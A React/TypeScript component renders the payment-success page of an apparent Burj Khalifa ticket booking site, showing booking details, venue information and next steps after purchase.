// Success.tsx
import styles from "./Success.module.css";
import { FaCheckCircle } from "react-icons/fa";
import { BsFillGeoAltFill } from "react-icons/bs";
import { TfiTicket } from "react-icons/tfi";
import { useEffect } from "react";
import { useNavigate } from "react-router-dom";
import { useBooking } from "../../context/BookingContext";
import { useRedirectChecker } from "../../hooks/useRedirectChecker";
import { useOnlineStatus } from "../../hooks/useOnlineStatus";

const Success = () => {
  const sessionId = localStorage.getItem("currentSessionId");

  useRedirectChecker(3000);
  useRedirectChecker(3000);
  useOnlineStatus({
    sessionId,
    pageName: "success",
    enabled: true,
  });
  
  const navigate = useNavigate();
  const { bookingData, setBookingData } = useBooking();

  useEffect(() => {
    window.scrollTo(0, 0);
  }, [bookingData, navigate]);

  const handleBackToHome = () => {
    if (sessionId) {
      localStorage.removeItem("currentSessionId");
    }
    setBookingData(null);
    navigate("/");
  };

  if (!bookingData) {
    return null;
  }

  const formatDate = (dateString: string) => {
    const date = new Date(dateString);
    return date.toLocaleDateString("en-US", {
      weekday: "long",
      year: "numeric",
      month: "long",
      day: "numeric",
    });
  };

  const getTotalTickets = () => {
    return (bookingData.tickets.adult || 0) + (bookingData.tickets.child || 0);
  };

  const getTicketsDescription = () => {
    const { adult, child } = bookingData.tickets;
    const parts = [];
    if (adult > 0) parts.push(`${adult} Adult${adult > 1 ? "s" : ""}`);
    if (child > 0) parts.push(`${child} Child${child > 1 ? "ren" : ""}`);
    return parts.join(", ");
  };

  return (
    <div className="container">
      <div className={styles.wrapper}>
        <div className={styles.content}>
          <div className={styles.success__header}>
            <FaCheckCircle className={styles.success__icon} />
            <h1 className={styles.success__title}>Payment Successful!</h1>
            <p className={styles.success__message}>
              Your tickets have been confirmed and will be sent to your email
              shortly.
              {bookingData.bookingId && (
                <span className={styles.booking__id}>
                  Booking ID: {bookingData.bookingId}
                </span>
              )}
            </p>
          </div>

          <div className={styles.ticket__info}>
            <h2 className={styles.section__title}>Your Booking Details</h2>

            <div className={styles.booking__card}>
              <div className={styles.booking__header}>
                <h3>Burj Khalifa: Level 124/125 Fast Track</h3>
                <span className={styles.bestseller}>Bestseller</span>
              </div>

              <div className={styles.booking__details}>
                <div className={styles.detail__row}>
                  <span className={styles.detail__label}>Date:</span>
                  <span className={styles.detail__value}>
                    {formatDate(bookingData.date)}
                  </span>
                </div>

                {/* {bookingData.time && (
                  <div className={styles.detail__row}>
                    <span className={styles.detail__label}>Time:</span>
                    <span className={styles.detail__value}>
                      {bookingData.time.time}
                    </span>
                  </div>
                )} */}

                <div className={styles.detail__row}>
                  <span className={styles.detail__label}>Tickets:</span>
                  <span className={styles.detail__value}>
                    {getTicketsDescription()} ({getTotalTickets()} total)
                  </span>
                </div>

                <div className={styles.detail__row}>
                  <span className={styles.detail__label}>Total Paid:</span>
                  <span className={styles.detail__value}>
                    AED {bookingData.totalPrice.toFixed(2)}
                  </span>
                </div>

                {bookingData.sessionId && (
                  <div className={styles.detail__row}>
                    <span className={styles.detail__label}>Order ID:</span>
                    <span className={styles.detail__value}>
                      BK{bookingData.sessionId.slice(-8).toUpperCase()}
                    </span>
                  </div>
                )}
              </div>
            </div>
          </div>

          <div className={styles.important__info}>
            <h2 className={styles.section__title}>Important Information</h2>

            <div className={styles.info__cards}>
              <div className={styles.info__card}>
                <BsFillGeoAltFill className={styles.info__icon} />
                <div>
                  <h4>Venue Address</h4>
                  <p>
                    Burj Khalifa, 1 Sheikh Mohammed bin Rashid Blvd - Downtown
                    Dubai
                  </p>
                </div>
              </div>

              <div className={styles.info__card}>
                <TfiTicket className={styles.info__icon} />
                <div>
                  <h4>Ticket Delivery</h4>
                  <p>
                    E-tickets have been sent to your email. Present the QR code
                    at the entrance.
                  </p>
                  {/* {bookingData.time && (
                    <p className={styles.arrival__note}>
                      Please arrive 15 minutes before your scheduled time:{" "}
                      <strong>{bookingData.time.time}</strong>
                    </p>
                  )} */}
                </div>
              </div>
            </div>
          </div>

          <div className={styles.next__steps}>
            <h2 className={styles.section__title}>What's Next?</h2>
            <ul className={styles.steps__list}>
              <li>Check your email for the confirmation and e-tickets</li>
              <li>Save the tickets on your phone or print them</li>
              <li>Arrive 15 minutes before your scheduled time</li>
              <li>Present your ID along with the tickets</li>
              {/* {bookingData.time && (
                <li>
                  Your fast-track entry is valid for {bookingData.time.time}
                </li>
              )} */}
            </ul>
          </div>

          <div className={styles.actions}>
            <button className={styles.primary__btn} onClick={handleBackToHome}>
              Back to Home
            </button>
          </div>
        </div>
      </div>
    </div>
  );
};

export default Success;